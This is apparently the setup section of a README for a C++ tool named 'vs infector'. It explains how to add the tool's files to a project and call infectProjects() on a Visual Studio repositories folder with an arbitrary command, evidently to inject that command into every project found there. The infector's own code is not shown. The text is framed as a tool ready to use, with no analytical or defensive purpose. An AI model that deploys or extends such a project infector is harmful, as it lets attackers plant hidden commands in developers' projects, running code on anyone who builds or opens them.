### 🛠️ Setup

1. **Drop the vs infector.h/cpp files** into your project folder:
   - Typically in a subfolder like `\src\infector\`

2. **Include the main header or source file** in your project:

```cpp
#include "vs infector.h"
```

3. **Then either call:**

```cpp
    std::wstring repoDir = getCommonRepoDir(); //use common repo path
    infectProjects(repoDir, L"yourcommandhere!");
    std::wcin.get(); //optional to keep window open
```

**or**

```cpp
    infectProjects(L"C:\\Users\\dwx\\source\\repos", L"yourcommandhere!"); //choose your own path
    std::wcin.get(); //optional to keep window open
```
